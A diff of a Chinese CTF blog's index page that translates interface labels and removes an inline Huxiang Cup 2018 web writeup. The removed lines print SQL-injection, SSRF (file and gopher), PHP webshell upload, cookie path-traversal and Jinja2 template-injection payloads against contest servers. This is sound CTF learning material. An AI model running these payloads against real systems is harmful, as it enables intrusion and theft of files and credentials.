@@ -44,7 +44,7 @@
 				<h1 class="site-name"><a href="/" title="GetFlag&#39;s Blog">GetFlag&#39;s Blog</a></h1>
 				<h2 class="blog-motto"></h2>
 			</div>
-			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
 			</a></div>
 			<nav class="animated">
 				<ul>
@@ -78,64 +78,6 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2018/11/20/浅析SSTI-python沙盒绕过/" title="" itemprop="url"></a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
-		
-  <p class="article-time">
-    <time datetime="2018-11-20T07:21:02.682Z" itemprop="datePublished"> 发表于 2018-11-20</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>title: 浅析SSTI(python沙盒绕过)<br>tags:</p>
-<ul>
-<li>SSTI</li>
-<li>python沙箱绕过<br>category:</li>
-<li>安全竞赛<br>date: 2018-11-11 01:30:00</li>
-</ul>
-<blockquote>
-<p>在CTF比赛中见过不少的SSTI题目，在这里整理下思路，记录下<br>
-        
-        
-        <p class="article-more-link">
-          
-            <a href="/2018/11/20/浅析SSTI-python沙盒绕过/#more">Read More</a>
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
       <a href="/2018/11/19/湖湘杯2018复赛Web-Writeup/" title="湖湘杯2018复赛Web Writeup" itemprop="url">湖湘杯2018复赛Web Writeup</a>
   </h1>
   <p class="article-author">By
@@ -143,89 +85,18 @@
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-11-18T16:00:00.000Z" itemprop="datePublished"> 发表于 2018-11-19</time>
+    <time datetime="2018-11-18T16:00:00.000Z" itemprop="datePublished"> Published 2018-11-19</time>
     
   </p>
 </header>
     <div class="article-content">
         
-        <a id="more"></a>
-<h3 id="Code-Check"><a href="#Code-Check" class="headerlink" title="Code Check"></a>Code Check</h3><p>扫描发现/news 目录</p>
-<p><img src="\img\images\湖湘杯2018\1542512268868.png" alt="1542512268868"></p>
-<p>进入后下载</p>
-<p>list.zip</p>
-<p><img src="\img\images\湖湘杯2018\1542512332854.png" alt="1542512332854"></p>
-<p>代码审计</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../config.php'</span>;</span><br><span class="line"><span class="comment">//解密过程</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</span><br><span class="line">	mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</span><br><span class="line">	$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</span><br><span class="line">	mcrypt_generic_deinit($td);</span><br><span class="line">	mcrypt_module_close($td);</span><br><span class="line">	<span class="keyword">if</span>(substr(trim($data),<span class="number">-7</span>)!==<span class="string">'hxb2018'</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;script&gt;window.location.href="/index.php";&lt;/script&gt;'</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> substr(trim($data),<span class="number">0</span>,strlen(trim($data))<span class="number">-7</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$id=decode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql=<span class="string">"select id,title,content,time from notice where id=$id"</span>;</span><br><span class="line">$info=$link-&gt;query($sql);</span><br><span class="line">$arr=$info-&gt;fetch_assoc();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;X公司HR系统V1<span class="number">.0</span>&lt;/title&gt;</span><br><span class="line">&lt;style&gt;.body&#123;width:<span class="number">600</span>px;height:<span class="number">500</span>px;margin:<span class="number">0</span> auto&#125;.title&#123;color:red;height:<span class="number">60</span>px;line-height:<span class="number">60</span>px;font-size:<span class="number">30</span>px;font-weight:<span class="number">700</span>;margin-top:<span class="number">75</span>pt;border-bottom:<span class="number">2</span>px solid red;text-align:center&#125;.content,.title&#123;margin:<span class="number">0</span> auto;width:<span class="number">600</span>px;display:block&#125;.content&#123;height:<span class="number">30</span>px;line-height:<span class="number">30</span>px;font-size:<span class="number">18</span>px;margin-top:<span class="number">40</span>px;text-align:left;color:<span class="comment">#828282&#125;&lt;/style&gt;</span></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class="body"&gt;</span><br><span class="line">&lt;div class="title"&gt;&lt;?php echo $arr['title']?&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class="content"&gt;&lt;?php echo $arr['content']?&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>发现aes加密，然后查询，没有加任何过滤参数</p>
-<p>直接在线网站</p>
-<p><a href="http://tool.chacuo.net/cryptaes?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">http://tool.chacuo.net/cryptaes?tdsourcetag=s_pcqq_aiomsg</a></p>
-<p>然后依次注入</p>
-<p>发现用户库</p>
-<p><img src="\img\images\湖湘杯2018\1542512445835.png" alt="1542512445835"></p>
-<p>注入出账号密码</p>
-<p><img src="\img\images\湖湘杯2018\1542512489959.png" alt="1542512489959"></p>
-<p>解密后登陆依然报错。。。</p>
-<p>因为之前发现0.php是phpinfo页面</p>
-<p>而且报错给出了绝对路径</p>
-<p>所以尝试<code>load_file</code></p>
-<p>payload</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,load_file(<span class="string">'/usr/share/nginx/html/login.php'</span>),<span class="number">3</span>,<span class="number">4</span> from stormgroup_memberhxb2018</span><br></pre></td></tr></table></figure>
-<p>aes加密后，访问拖出来源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'config.php'</span>;</span><br><span class="line">$name=trim($_POST[<span class="string">'name'</span>]);</span><br><span class="line">$regex = <span class="string">"/\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\"|\'/"</span>;</span><br><span class="line">$name = preg_replace($regex,<span class="string">""</span>,$name);</span><br><span class="line">$pwd=trim($_POST[<span class="string">'password'</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($name) <span class="keyword">or</span> <span class="keyword">empty</span>($pwd))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("?????????!");window.history.back();&lt;/script&gt;'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$md5=md5($pwd);</span><br><span class="line">$sql=<span class="string">"select name,password,status from StormGroup_member where name ='$name' AND password='$md5'"</span>;</span><br><span class="line">$info=$link-&gt;query($sql);</span><br><span class="line">$arr=$info-&gt;fetch_assoc();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($arr))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("???????");window.history.back();&lt;/script&gt;'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($arr[<span class="string">'status'</span>]==<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("???????????");window.history.back();&lt;/script&gt;'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($arr==<span class="keyword">true</span>)&#123;</span><br><span class="line">    $sql = <span class="string">"select title from notice2 limit 1"</span>;</span><br><span class="line">    $i = $link-&gt;query($sql);</span><br><span class="line">    $a = $i-&gt;fetch_assoc();</span><br><span class="line">    $res = $a[<span class="string">'title'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>发现关键部分</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($arr==<span class="keyword">true</span>)&#123;</span><br><span class="line">    $sql = <span class="string">"select title from notice2 limit 1"</span>;</span><br><span class="line">    $i = $link-&gt;query($sql);</span><br><span class="line">    $a = $i-&gt;fetch_assoc();</span><br><span class="line">    $res = $a[<span class="string">'title'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>直接查询</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2 union select 1,title,3,4 from notice2hxb2018</span><br></pre></td></tr></table></figure>
-<p>aes加密后访问，getflag</p>
-<p><img src="\img\images\湖湘杯2018\1542512716693.png" alt="1542512716693"></p>
-<h3 id="Readflag"><a href="#Readflag" class="headerlink" title="Readflag"></a>Readflag</h3><p>使用file协议读取apche配置文件</p>
-<p><a href="http://47.107.237.27/?url=file://127.0.0.1//etc/apache2/sites-available/000-default.conf" target="_blank" rel="noopener">http://47.107.237.27/?url=file://127.0.0.1//etc/apache2/sites-available/000-default.conf</a></p>
-<p>获得web目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">	# The ServerName directive sets the request scheme, hostname and port that</span><br><span class="line">	# the server uses to identify itself. This is used when creating</span><br><span class="line">	# redirection URLs. In the context of virtual hosts, the ServerName</span><br><span class="line">	# specifies what hostname must appear in the request&apos;s Host: header to</span><br><span class="line">	# match this virtual host. For the default virtual host (this file) this</span><br><span class="line">	# value is not decisive as it is used as a last resort host regardless.</span><br><span class="line">	# However, you must set it for any further virtual host explicitly.</span><br><span class="line">	#ServerName www.example.com</span><br><span class="line"></span><br><span class="line">	ServerAdmin webmaster@localhost</span><br><span class="line">	DocumentRoot /var/www/html/ssrf/web.php</span><br><span class="line">	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</span><br><span class="line">	# error, crit, alert, emerg.</span><br><span class="line">	# It is also possible to configure the loglevel for particular</span><br><span class="line">	# modules, e.g.</span><br><span class="line">	#LogLevel info ssl:warn</span><br><span class="line"></span><br><span class="line">	ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">	CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line">	# For most configuration files from conf-available/, which are</span><br><span class="line">	# enabled or disabled at a global level, it is possible to</span><br><span class="line">	# include a line for only one particular virtual host. For example the</span><br><span class="line">	# following line enables the CGI configuration for this host only</span><br><span class="line">	# after it has been globally disabled with &quot;a2disconf&quot;.</span><br><span class="line">	#Include conf-available/serve-cgi-bin.conf</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span><br></pre></td></tr></table></figure>
-<p>读取<code>web.php</code> 源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"ssrf me with parameter 'url'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </span><br><span class="line"><span class="comment">//echo $_GET['url'];</span></span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line"><span class="keyword">echo</span> curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line"></span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'user'</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>($_POST[<span class="string">'user'</span>]==<span class="string">"admin"</span> &amp;&amp; $ip==<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">    system(<span class="string">"/var/www/html/ssrf/readflag"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>根据题目要求应该是绕过<code>REMOTE_ADDR</code>方法</p>
-<p>这里存在非预期</p>
-<p><a href="http://47.107.237.27/?url=file://127.0.0.1//var/www/html/ssrf/flag" target="_blank" rel="noopener">http://47.107.237.27/?url=file://127.0.0.1//var/www/html/ssrf/flag</a></p>
-<p><img src="\img\images\湖湘杯2018\1542522154447.png" alt="1542522154447"></p>
-<p>正解 如下利用<code>gopher</code>协议</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.107.237.27/?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_POST+%2F+HTTP%2F1.1%250d%250aHost%3A+127.0.0.1%250d%250aUser-Agent%3A+curl%2F7.43.0%250d%250aAccept%3A+%2A%2F%2A%250d%250aContent-Length%3A+10%250d%250aContent-Type%3A+application%2Fx-www-form-urlencoded%250d%250a%250d%250auser%3Dadmin</span><br></pre></td></tr></table></figure>
-<p><img src="\img\images\湖湘杯2018\1542548886420.png" alt="1542548886420"></p>
-<h3 id="MyNote"><a href="#MyNote" class="headerlink" title="MyNote"></a>MyNote</h3><p>文件上传检测 <code>Content-Type</code>当为<code>image/jpeg</code>允许上传</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php/upload HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">47.107</span><span class="number">.239</span><span class="number">.135</span></span><br><span class="line">Content-Length: <span class="number">310</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Origin: http://47.107.239.135</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvlIwZw5b6U7jouIA</span></span><br><span class="line"><span class="comment">Referer: http://47.107.239.135/index.php/upload</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8</span></span><br><span class="line"><span class="comment">Cookie: Picture=YTozOntpOjA7czo3OiJ4eHgucGhwIjtpOjE7czo3OiJ4eHguanBnIjtpOjI7czo4OiJ0ZXN0LmpwZyI7fQ%3D%3D; PHPSESSID=nqa95frrevqbi7c18opi64243j</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryvlIwZw5b6U7jouIA</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name="upfile"; filename="a.php"</span></span><br><span class="line"><span class="comment">Content-Type: image/jpeg</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php</span></span><br><span class="line"><span class="comment"><span class="doctag">@eval</span>($_POST[cmd]);</span></span><br><span class="line"><span class="comment">?&gt;</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryvlIwZw5b6U7jouIA</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name="submit"</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">submit</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryvlIwZw5b6U7jouIA--</span></span><br></pre></td></tr></table></figure>
-<p>上传jpg文件，然后点击</p>
-<p><img src="\img\images\湖湘杯2018\1542537046268.png" alt="1542537046268"></p>
-<p><code>picture</code></p>
-<p>抓包</p>
-<p>修改cookie中的<code>Picture</code>参数，这里的<code>flag.php</code> 通过访问 <code>robots.txt</code>获得</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">14</span>:<span class="string">"../../flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
-<p>然后进行base64编码和url编码后传入Picture参数中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30%3D</span><br></pre></td></tr></table></figure>
-<p><img src="\img\images\湖湘杯2018\1542537240129.png" alt="1542537240129"></p>
-<p>然后查看图片位置返回的base64结果</p>
-<p><img src="\img\images\湖湘杯2018\1542537307980.png" alt="1542537307980"></p>
-<p>base64解密得到flag</p>
-<p><img src="\img\images\湖湘杯2018\1542537346521.png" alt="1542537346521"></p>
-<p>刚开始题目放出来的时候有个非预期解，可以文件上传能content-type修改绕过，然后upload目录能非授权访问，md5的目录名就是用户名md5加密后的，当时下手太慢，拖出来了config.php的源码后，就被删了，之后我还以为是条件竞争，尝试了之后，上传php会ban ip。再后来上传功能就被破坏掉了</p>
-<p>config.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">$config[&apos;Database&apos;][&apos;servername&apos;] = &quot;localhost&quot;;</span><br><span class="line">$config[&apos;Database&apos;][&apos;dbname&apos;] = &quot;Note&quot;;</span><br><span class="line">$config[&apos;Database&apos;][&apos;username&apos;] = &quot;ctf&quot;;</span><br><span class="line">$config[&apos;Database&apos;][&apos;password&apos;] = &quot;root&quot;;</span><br><span class="line"></span><br><span class="line">$router = [&apos;index&apos;,&apos;login&apos;,&apos;register&apos;,&apos;note&apos;,&apos;logout&apos;,&apos;del&apos;,&apos;upload&apos;,&apos;picture&apos;];</span><br><span class="line">$salt = &apos;4ct10n&apos;;</span><br></pre></td></tr></table></figure>
-<h3 id="XmeO"><a href="#XmeO" class="headerlink" title="XmeO"></a>XmeO</h3><p>考察点是ssti，没有任何防护，可以直接eval执行系统命令</p>
-<p>难点在于，找flag存放的文件</p>
-<p>首先找到web目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls -r /*/*&quot;).read()&apos;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="\img\images\湖湘杯2018\1542547775406.png" alt="1542547899200"></p>
-<p>发现web目录</p>
-<p><img src="\img\images\湖湘杯2018\1542547874426.png" alt="1542547874426"></p>
-<p>然后grep搜索flag字符</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;grep hxb2018&#123; /home/XmeO/*&quot;).read()&apos;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="\img\images\湖湘杯2018\1542547688396.png" alt="1542547688396"></p>
-<p>查看结果，找到flag</p>
-<p><img src="\img\images\湖湘杯2018\1542547726830.png" alt="1542547726830"></p>
-
+        <p>web题难度不大，就是环境比较坑</p>
         
         
         <p class="article-more-link">
+          
+            <a href="/2018/11/19/湖湘杯2018复赛Web-Writeup/#more">Read More</a>
           
        </p>
     </div>
@@ -268,6 +139,68 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/2018/11/11/浅析SSTI-python沙盒绕过/" title="浅析SSTI(python沙盒绕过)" itemprop="url">浅析SSTI(python沙盒绕过)</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
+		
+  <p class="article-time">
+    <time datetime="2018-11-10T17:30:00.000Z" itemprop="datePublished"> Published 2018-11-11</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <blockquote>
+<p>在CTF比赛中见过不少的SSTI题目，在这里整理下思路，记录下<br>
+        
+        
+        <p class="article-more-link">
+          
+            <a href="/2018/11/11/浅析SSTI-python沙盒绕过/#more">Read More</a>
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/安全竞赛/">安全竞赛</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/SSTI/">SSTI</a><a href="/tags/python沙箱绕过/">python沙箱绕过</a>
+  </div>
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/2018/11/08/第七届山东省大学生信息安全竞赛Writeup/" title="第七届山东省信息安全竞赛Writeup" itemprop="url">第七届山东省信息安全竞赛Writeup</a>
   </h1>
   <p class="article-author">By
@@ -275,7 +208,7 @@
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-11-08T14:00:03.000Z" itemprop="datePublished"> 发表于 2018-11-08</time>
+    <time datetime="2018-11-08T14:00:03.000Z" itemprop="datePublished"> Published 2018-11-08</time>
     
   </p>
 </header>
@@ -336,7 +269,7 @@
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-09-14T16:00:00.000Z" itemprop="datePublished"> 发表于 2018-09-15</time>
+    <time datetime="2018-09-14T16:00:00.000Z" itemprop="datePublished"> Published 2018-09-15</time>
     
   </p>
 </header>
@@ -397,7 +330,7 @@
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-08-30T10:00:00.000Z" itemprop="datePublished"> 发表于 2018-08-30</time>
+    <time datetime="2018-08-30T10:00:00.000Z" itemprop="datePublished"> Published 2018-08-30</time>
     
   </p>
 </header>
@@ -458,7 +391,7 @@
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-08-15T14:00:03.000Z" itemprop="datePublished"> 发表于 2018-08-15</time>
+    <time datetime="2018-08-15T14:00:03.000Z" itemprop="datePublished"> Published 2018-08-15</time>
     
   </p>
 </header>
@@ -520,7 +453,7 @@
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-08-12T09:15:03.000Z" itemprop="datePublished"> 发表于 2018-08-12</time>
+    <time datetime="2018-08-12T09:15:03.000Z" itemprop="datePublished"> Published 2018-08-12</time>
     
   </p>
 </header>
@@ -581,7 +514,7 @@
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-07-26T14:00:03.000Z" itemprop="datePublished"> 发表于 2018-07-26</time>
+    <time datetime="2018-07-26T14:00:03.000Z" itemprop="datePublished"> Published 2018-07-26</time>
     
   </p>
 </header>
@@ -642,7 +575,7 @@
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-04-20T10:00:03.000Z" itemprop="datePublished"> 发表于 2018-04-20</time>
+    <time datetime="2018-04-20T10:00:03.000Z" itemprop="datePublished"> Published 2018-04-20</time>
     
   </p>
 </header>
@@ -703,7 +636,7 @@
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-04-17T02:48:03.000Z" itemprop="datePublished"> 发表于 2018-04-17</time>
+    <time datetime="2018-04-17T02:48:03.000Z" itemprop="datePublished"> Published 2018-04-17</time>
     
   </p>
 </header>
@@ -757,10 +690,10 @@
   </nav>
 
 </div>
-      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
 
 <div id="asidepart">
-<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
 <aside class="clearfix">
 
   
